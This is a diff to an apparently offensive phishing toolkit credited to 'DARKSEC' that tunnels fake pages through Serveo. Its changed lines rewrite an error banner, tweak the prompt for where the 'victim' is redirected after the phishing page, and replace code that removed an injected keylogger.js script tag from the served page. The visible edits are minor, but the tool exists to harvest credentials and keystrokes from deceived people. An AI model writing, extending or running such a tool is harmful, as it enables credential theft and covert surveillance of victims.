@@ -143,11 +143,7 @@ def runServeo():
         print("\n{0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
     except CalledProcessError:
-        print (_('''{1}
-        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
+        print (_('''\n\n{0}FAILED !!!...{1}FAILED !!!..{0}FAILED !!!\n\n{0}[{1}!{0}]{0} Please Make Sure:\n{1} 1)~ If You are still connected to the Internet.\n 2)~ If You Have Chosen A {0}Valid{0}{1} Custom URL. \n     As Serveo Implemented More Security To Stop misuse of the service.\n 3)~ You Can Give another Try.\n\n\n{0}SCRIPT STOPPED {1}!! \n
 ''').format(RED, DEFAULT))
         exit(0)
           
@@ -272,7 +268,7 @@ def inputCustom(): #Question where user can input custom web-link
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))      
      print(_('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)''').format(RED, DEFAULT))
      print(_('''\n{1}**{0}(Leave Blank To Loop The Phishing Page)''').format(RED, DEFAULT))
-     print(_('''\n{0}[{1}*{0}]{0}Insert a custom redirect url:''').format(RED, DEFAULT))
+     print(_('''\n{0}[{1}/!\{0}]{0}Insert a custom redirect url:''').format(RED, DEFAULT))
      custom = input(_('''\n{0}REDIRECT HERE>>> {1}''').format(RED, DEFAULT))
      if 'http://' in custom or 'https://' in custom:
          pass
@@ -323,14 +319,8 @@ def addingkeylogger():
          sleep(7.5)
           
      else:
-         with open('Server/www/index.html') as f:
-             read_data = f.read()
-         c = read_data.replace('</title><script src="keylogger.js"></script>', '</title>')
-         f = open('Server/www/index.html', 'w')
-         f.write(c)
-         f.close()
-         
-         print(_("\n\n{1}[{0}??{1}]{0} Keylogger Removed {1}Successfully...\n").format(RED, DEFAULT))
+         pass
+         print(_("\n\n{1}[{0}!!{1}]{0} Keylogger {1}Not Added{0}... \n").format(RED, DEFAULT))
          sleep(7.0)
 	
 	
